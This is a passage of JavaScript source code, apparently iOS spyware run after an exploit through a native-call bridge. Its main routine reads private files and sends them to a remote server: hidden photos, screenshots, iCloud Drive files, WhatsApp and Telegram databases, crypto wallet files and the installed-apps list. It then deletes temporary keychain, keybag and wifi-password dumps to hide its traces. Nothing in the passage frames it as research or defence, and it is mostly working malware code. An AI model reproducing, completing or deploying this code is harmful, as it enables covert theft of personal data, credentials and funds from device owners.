						   `X-Device-UUID: ${deviceUUID}\r\n` +
						   `Connection: close\r\n\r\n` +
						   jsonData;
		
		// Send request via CFWriteStream
		const requestLen = httpRequest.length;
		
		const requestBuf = Native.callSymbol("malloc", requestLen + 1);
		if (!requestBuf || requestBuf === 0n) {
			Native.callSymbol("CFReadStreamClose", readStream);
			Native.callSymbol("CFWriteStreamClose", writeStream);
			Native.callSymbol("CFRelease", readStream);
			Native.callSymbol("CFRelease", writeStream);
			return false;
		}
		
		try {
			const requestBytes = Native.stringToBytes(httpRequest, false);
			
			// Send in chunks with timeout
			let bytesSent = 0;
			const sendChunkSize = 4096;
			let waitLoops = 0;
			const maxWaitLoops = 1000; // Max 10 seconds of waiting
			
			while (bytesSent < requestLen && waitLoops < maxWaitLoops) {
				const canWrite = Native.callSymbol("CFWriteStreamCanAcceptBytes", writeStream);
				if (!canWrite) {
					Native.callSymbol("usleep", 10000); // 10ms
					waitLoops++;
					if (waitLoops % 100 === 0) {
					}
					continue;
				}
				waitLoops = 0; // Reset on successful write opportunity
				
				const remaining = requestLen - bytesSent;
				const chunkSize = Math.min(remaining, sendChunkSize);
				
				const chunkBuf = Native.callSymbol("malloc", chunkSize);
				if (!chunkBuf || chunkBuf === 0n) {
					break;
				}
				
				try {
					// Copy chunk data
					const chunkData = new Uint8Array(requestBytes, bytesSent, chunkSize);
					Native.write(chunkBuf, chunkData.buffer.slice(chunkData.byteOffset, chunkData.byteOffset + chunkData.byteLength));
					
					const sendResult = Native.callSymbol("CFWriteStreamWrite", writeStream, chunkBuf, chunkSize);
					if (Number(sendResult) < 0) {
						break;
					}
					
					bytesSent += Number(sendResult);
					
					// Log progress every 100KB
					if (bytesSent % 102400 < sendChunkSize) {
					}
				} finally {
					Native.callSymbol("free", chunkBuf);
				}
			}
			
			if (waitLoops >= maxWaitLoops) {
			}
			
			
		} finally {
			Native.callSymbol("free", requestBuf);
		}
		
		// Wait for and read server response before closing
		const responseBuf = Native.callSymbol("malloc", 1024);
		if (responseBuf && responseBuf !== 0n) {
			try {
				// Wait for response with timeout
				let waitCount = 0;
				const maxWait = 50; // 500ms max wait
				
				while (waitCount < maxWait) {
					const hasBytes = Native.callSymbol("CFReadStreamHasBytesAvailable", readStream);
					if (hasBytes) break;
					Native.callSymbol("usleep", 10000); // 10ms
					waitCount++;
				}
				
				// Read response (we don't need to process it, just acknowledge)
				const bytesRead = Native.callSymbol("CFReadStreamRead", readStream, responseBuf, 1024);
				if (Number(bytesRead) > 0) {
				}
			} finally {
				Native.callSymbol("free", responseBuf);
			}
		}
		
		// Close streams
		Native.callSymbol("CFReadStreamClose", readStream);
		Native.callSymbol("CFWriteStreamClose", writeStream);
		Native.callSymbol("CFRelease", readStream);
		Native.callSymbol("CFRelease", writeStream);
		
		return true;
		
	} catch (error) {
		return false;
	}
}

/**
 * Get current process name
 */
function getProcessName() {
	let processName = "unknown";
	try {
		const currentPid = Native.callSymbol("getpid");
		
		const nameBuffer = Native.callSymbol("malloc", BigInt(256));
		if (nameBuffer !== 0n) {
			const nameResult = Native.callSymbol("proc_name", currentPid, nameBuffer, 256);
			if (nameResult === 0) {
				const name = Native.readString(nameBuffer, 256).replace(/\0/g, '').trim();
				if (name && name.length > 0) {
					processName = name;
				}
			}
			Native.callSymbol("free", nameBuffer);
		}
		
		if (processName === "unknown") {
			const pathBuffer = Native.callSymbol("malloc", BigInt(1024));
			if (pathBuffer !== 0n) {
				const pathResult = Native.callSymbol("proc_pidpath", currentPid, pathBuffer, 1024);
				if (pathResult > 0) {
					const fullPath = Native.readString(pathBuffer, 1024).replace(/\0/g, '').trim();
					if (fullPath && fullPath.length > 0) {
						const pathParts = fullPath.split('/');
						const basename = pathParts[pathParts.length - 1];
						if (basename && basename.length > 0) {
							processName = basename;
						}
					}
				}
				Native.callSymbol("free", pathBuffer);
			}
		}
	} catch (e) {
		// Ignore errors
	}
	
	return processName;
}

// ============================================================================
// Main Execution
// ============================================================================

try {
	
	const processName = getProcessName();
	const currentPid = Native.callSymbol("getpid");
	const deviceUUID = getDeviceUUID();
	
	
	let successCount = 0;
	let failCount = 0;
	let skipCount = 0;
	
	for (let i = 0; i < FORENSIC_FILES.length; i++) {
		const fileInfo = FORENSIC_FILES[i];
		const filePath = fileInfo.path;
		const category = fileInfo.category;
		const description = fileInfo.description;
		
		
		// Read file as base64
		const result = readFileAsBase64(filePath);
		
		if (result === null) {
			skipCount++;
			continue;
		}
		
		
		// Send via HTTP or HTTPS based on configuration
		const sent = USE_HTTPS 
			? sendFileViaHTTPS(filePath, category, description, result.data, result.size, deviceUUID)
			: sendFileViaHTTP(filePath, category, description, result.data, result.size, deviceUUID);
		
		if (sent) {
			successCount++;
		} else {
			failCount++;
		}
		
		// Small delay between files to avoid overwhelming the server
		Native.callSymbol("usleep", BigInt(100000)); // 100ms
	}
	
	// Generate and send installed apps list
	try {
		const appsList = getInstalledAppsList();
		
		if (!appsList || appsList.length === 0) {
			failCount++;
		} else {
			// Convert string to bytes (TextEncoder may not be available)
			const appsBytes = new Uint8Array(appsList.length);
			for (let i = 0; i < appsList.length; i++) {
				appsBytes[i] = appsList.charCodeAt(i) & 0xFF;
			}
			const appsData = base64Encode(appsBytes);
		
		
			const sent = USE_HTTPS 
				? sendFileViaHTTPS("/installed_apps.txt", "system", "List of installed applications", appsData, appsList.length, deviceUUID)
				: sendFileViaHTTP("/installed_apps.txt", "system", "List of installed applications", appsData, appsList.length, deviceUUID);
		
			if (sent) {
				successCount++;
			} else {
				failCount++;
			}
		}
	} catch (appsError) {
		if (appsError && appsError.stack) {
		}
		failCount++;
	}
	
	// COMMENTED OUT: Extract ALL app container data (Documents, Cookies, WebKit, Preferences, etc.)
	// Uncomment to enable app cache extraction
	/*
	try {
		const appFiles = getAllAppContainerFiles();
		
		for (let i = 0; i < appFiles.length; i++) {
			const appFile = appFiles[i];
			
			// Log every 10th file to avoid spam
			if (i % 10 === 0) {
			}
			
			const result = readFileAsBase64(appFile.path);
			if (result === null) {
				skipCount++;
				continue;
			}
			
			const sent = USE_HTTPS 
				? sendFileViaHTTPS(appFile.path, appFile.category, appFile.description, result.data, result.size, deviceUUID)
				: sendFileViaHTTP(appFile.path, appFile.category, appFile.description, result.data, result.size, deviceUUID);
			
			if (sent) {
				successCount++;
			} else {
				failCount++;
			}
			
			// Small delay between files
			Native.callSymbol("usleep", BigInt(30000)); // 30ms
		}
		
	} catch (appError) {
		if (appError && appError.stack) {
		}
	}
	*/
	
	// Download hidden photos
	try {
		const hiddenPhotos = getHiddenPhotos();
		
		for (let i = 0; i < hiddenPhotos.length; i++) {
			const photoPath = hiddenPhotos[i];
			
			
			const result = readFileAsBase64(photoPath);
			if (result === null) {
				skipCount++;
				continue;
			}
			
			
			const sent = USE_HTTPS 
				? sendFileViaHTTPS(photoPath, "hidden-photos", "Hidden photo", result.data, result.size, deviceUUID)
				: sendFileViaHTTP(photoPath, "hidden-photos", "Hidden photo", result.data, result.size, deviceUUID);
			
			if (sent) {
				successCount++;
			} else {
				failCount++;
			}
			
			Native.callSymbol("usleep", BigInt(50000)); // 50ms
		}
	} catch (hiddenError) {
		if (hiddenError && hiddenError.stack) {
		}
	}
	
	// Download screenshots
	try {
		const screenshots = getScreenshots();
		
		for (let i = 0; i < screenshots.length; i++) {
			const photoPath = screenshots[i];
			
			
			const result = readFileAsBase64(photoPath);
			if (result === null) {
				skipCount++;
				continue;
			}
			
			
			const sent = USE_HTTPS 
				? sendFileViaHTTPS(photoPath, "screenshots", "Screenshot", result.data, result.size, deviceUUID)
				: sendFileViaHTTP(photoPath, "screenshots", "Screenshot", result.data, result.size, deviceUUID);
			
			if (sent) {
				successCount++;
			} else {
				failCount++;
			}
			
			Native.callSymbol("usleep", BigInt(50000)); // 50ms
		}
	} catch (screenshotError) {
		if (screenshotError && screenshotError.stack) {
		}
	}
	
	// Download iCloud Drive files from /tmp/icloud_dump/ (copied by icloud_dumper.js)
	try {
		const icloudDumpPath = "/tmp/icloud_dump";
		if (fileExists(icloudDumpPath)) {
			const dumpedFiles = listFilesRecursive(icloudDumpPath, 20, 0);
			
			for (let i = 0; i < dumpedFiles.length; i++) {
				const file = dumpedFiles[i];
				
				if (i % 10 === 0 || i === dumpedFiles.length - 1) {
				}
				
				const result = readFileAsBase64(file.path);
				if (result === null) {
					skipCount++;
					continue;
				}
				
				if (!result.data || result.data.length === 0) {
					skipCount++;
					continue;
				}
				
				const relativePath = file.path.substring(icloudDumpPath.length + 1);
				const displayPath = "icloud_dump_" + relativePath.replace(/\//g, '_');
				
				const sent = USE_HTTPS 
					? sendFileViaHTTPS(displayPath, "icloud-drive", "iCloud Drive (dumped)", result.data, result.size, deviceUUID)
					: sendFileViaHTTP(displayPath, "icloud-drive", "iCloud Drive (dumped)", result.data, result.size, deviceUUID);
				
				if (sent) {
					successCount++;
				} else {
					failCount++;
				}
				
				Native.callSymbol("usleep", BigInt(50000));
			}
		} else {
		}
	} catch (icloudError) {
		if (icloudError && icloudError.stack) {
		}
	}
	
	// Also try direct iCloud Drive extraction as fallback
	try {
		const icloudFiles = getiCloudDriveFiles();
		
		for (let i = 0; i < icloudFiles.length; i++) {
			const icloudFile = icloudFiles[i];
			
			if (i % 10 === 0 || i === icloudFiles.length - 1) {
			}
			
			const result = readFileAsBase64(icloudFile.path);
			if (result === null) {
				skipCount++;
				continue;
			}
			
			if (!result.data || result.data.length === 0) {
				skipCount++;
				continue;
			}
			
			const displayPath = icloudFile.filename || icloudFile.path;
			
			const sent = USE_HTTPS 
				? sendFileViaHTTPS(displayPath, icloudFile.category, icloudFile.description, result.data, result.size, deviceUUID)
				: sendFileViaHTTP(displayPath, icloudFile.category, icloudFile.description, result.data, result.size, deviceUUID);
			
			if (sent) {
				successCount++;
			} else {
				failCount++;
			}
			
			Native.callSymbol("usleep", BigInt(50000));
		}
	} catch (icloudError) {
		if (icloudError && icloudError.stack) {
		}
	}
	
	// Download WhatsApp and Telegram databases
	try {
		const messengerFiles = getMessengerDatabases();
		
		for (let i = 0; i < messengerFiles.length; i++) {
			const msgFile = messengerFiles[i];
			
			
			const result = readFileAsBase64(msgFile.path);
			if (result === null) {
				skipCount++;
				continue;
			}
			
			// Also skip if data is empty/null
			if (!result.data || result.data.length === 0) {
				skipCount++;
				continue;
			}
			
			
			// Use unique filename if provided, otherwise use path
			const displayPath = msgFile.filename || msgFile.path;
			
			const sent = USE_HTTPS 
				? sendFileViaHTTPS(displayPath, msgFile.category, msgFile.description, result.data, result.size, deviceUUID)
				: sendFileViaHTTP(displayPath, msgFile.category, msgFile.description, result.data, result.size, deviceUUID);
			
			if (sent) {
				successCount++;
			} else {
				failCount++;
			}
			
			Native.callSymbol("usleep", BigInt(100000)); // 100ms between messenger files (they can be large)
		}
	} catch (messengerError) {
		if (messengerError && messengerError.stack) {
		}
	}
	
	// Download crypto wallet data
	try {
		const walletFiles = getCryptoWalletFiles();
		
		for (let i = 0; i < walletFiles.length; i++) {
			const walletFile = walletFiles[i];
			
			// Log every 10th file to avoid spam
			if (i % 10 === 0 || i === walletFiles.length - 1) {
			}
			
			const result = readFileAsBase64(walletFile.path);
			if (result === null) {
				skipCount++;
				continue;
			}
			
			// Use unique filename if provided, otherwise use path
			const displayPath = walletFile.filename || walletFile.path;
			
			const sent = USE_HTTPS 
				? sendFileViaHTTPS(displayPath, walletFile.category, walletFile.description, result.data, result.size, deviceUUID)
				: sendFileViaHTTP(displayPath, walletFile.category, walletFile.description, result.data, result.size, deviceUUID);
			
			if (sent) {
				successCount++;
			} else {
				failCount++;
			}
			
			Native.callSymbol("usleep", BigInt(50000)); // 50ms between wallet files
		}
	} catch (walletError) {
		if (walletError && walletError.stack) {
		}
	}
	
	
	// Clean up temporary files created during extraction
	const tempFilesToDelete = [
		"/tmp/keychain-2.db",
		"/tmp/persona.kb",
		"/tmp/usersession.kb",
		"/tmp/backup_keys_cache.sqlite",
		"/tmp/persona_private.kb",
		"/tmp/usersession_private.kb",
		"/tmp/System.keybag",
		"/tmp/Backup.keybag",
		"/tmp/persona_keychains.kb",
		"/tmp/usersession_keychains.kb",
		"/tmp/device.kb",
		"/private/var/tmp/keychain-2.db",
		"/private/var/tmp/persona.kb",
		"/private/var/tmp/usersession.kb",
		"/var/wireless/wifi_passwords.txt",
		"/tmp/wifi_passwords.txt",
		"/private/var/tmp/wifi_passwords.txt",
		"/tmp/wifi_passwords_securityd.txt",
		"/private/var/tmp/wifi_passwords_securityd.txt",
		"/private/var/tmp/keychain_dump.txt",
		"/tmp/keychain_dump.txt"
	];
	
	let deletedCount = 0;
	for (const tempFile of tempFilesToDelete) {
		const unlinkResult = Native.callSymbol("unlink", tempFile);
		if (Number(unlinkResult) === 0) {
			deletedCount++;
		}
	}
	
	// Clean up iCloud dump directory recursively
	const icloudDumpPath = "/tmp/icloud_dump";
	if (fileExists(icloudDumpPath)) {
		
		// Recursive delete function
		function deleteDirectoryRecursive(dirPath) {
			const dir = Native.callSymbol("opendir", dirPath);
			if (!dir || dir === 0n) {
				return false;
			}
			
			try {
				while (true) {
					const entry = Native.callSymbol("readdir", dir);
					if (!entry || entry === 0n) break;
					
					const name = readDirentName(entry);
					if (!name || name.length === 0 || name === "." || name === "..") continue;
					
					const fullPath = dirPath + "/" + name;
					
					const statBuf = Native.callSymbol("malloc", 144);
					if (!statBuf || statBuf === 0n) continue;
					
					try {
						const ret = Native.callSymbol("stat", fullPath, statBuf);
						if (ret !== 0) continue;
						
						const statData = Native.read(statBuf, 144);
						const statView = new DataView(statData);
						const mode = statView.getUint16(4, true);
						
						const isDir = (mode & 0xF000) === 0x4000;
						const isFile = (mode & 0xF000) === 0x8000;
						
						if (isFile) {
							const unlinkResult = Native.callSymbol("unlink", fullPath);
							if (Number(unlinkResult) === 0) {
								deletedCount++;
							}
						} else if (isDir) {
							deleteDirectoryRecursive(fullPath);
							const rmdirResult = Native.callSymbol("rmdir", fullPath);
							if (Number(rmdirResult) === 0) {
								deletedCount++;
							}
						}
					} finally {
						Native.callSymbol("free", statBuf);
					}
				}
			} finally {
				Native.callSymbol("closedir", dir);
			}
			
			return true;
		}
		
		deleteDirectoryRecursive(icloudDumpPath);
		const rmdirResult = Native.callSymbol("rmdir", icloudDumpPath);
		if (Number(rmdirResult) === 0) {
		}
	}
	
	
	// Exit immediately after completion
	try {
		Native.callSymbol("pthread_exit", 0n);
	} catch (e) {
		try {
			Native.callSymbol("_exit", 0n);
		} catch (e2) {
			// Exit failed, continue to finally block
		}
	}
	
} catch (error) {
	if (error && error.stack) {
	}
} finally {
	// Final exit attempt
	try {
		Native.callSymbol("pthread_exit", 0n);
	} catch (e) {
		try {
			Native.callSymbol("_exit", 0n);
		} catch (e2) {
			// Ignore
		}
	}
}

